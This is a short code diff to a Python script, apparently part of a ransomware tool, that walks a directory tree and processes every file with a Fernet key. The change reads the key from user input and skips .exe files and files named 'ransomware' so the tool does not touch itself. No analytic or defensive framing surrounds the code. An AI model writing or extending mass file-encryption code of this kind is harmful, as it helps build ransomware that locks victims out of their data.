@@ -1,9 +1,8 @@
 import os
 from cryptography.fernet import Fernet
 
-# Get the key from the file
-with open("key.txt", "rb") as file:
-    key = file.read()
+# Get the key from user input
+key = input("Enter the encryption key: ").encode()
 
 # Create the Fernet object
 fernet = Fernet(key)
@@ -18,6 +17,8 @@ for root, dirs, files in os.walk(directory):
         # Check if the file is a regular file
         if os.path.isfile(filename):
             if filename.endswith(".exe"):
+                continue
+            if filename.startswith("ransomware"):
                 continue
             with open(filename, "rb") as f:
                 encrypted_data = f.read()
